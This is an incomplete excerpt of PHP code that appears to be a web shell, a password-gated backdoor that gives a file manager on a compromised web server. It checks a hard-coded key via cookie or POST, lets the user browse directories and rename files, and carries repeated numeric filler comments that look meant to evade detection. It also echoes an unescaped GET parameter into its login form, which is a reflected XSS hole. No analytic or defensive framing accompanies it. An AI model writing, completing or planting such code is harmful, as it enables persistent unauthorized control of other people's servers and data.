...
$pass = false;
if (isset($_COOKIE['pw_name_49891'])) {
    if(($_COOKIE['pw_name_49891']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_49891'])) {
        if(($_POST['pw_name_49891']) == $auth_key) {
            setcookie("pw_name_49891", $_POST['pw_name_49891']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_49891' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774507268 1724682774684712 1724682774609309 1724682774815068
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774507268 1724682774684712 1724682774609309 1724682774815068
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774507268 1724682774684712 1724682774609309 1724682774815068
            $name = PATH . "/" . $_GET['r'];
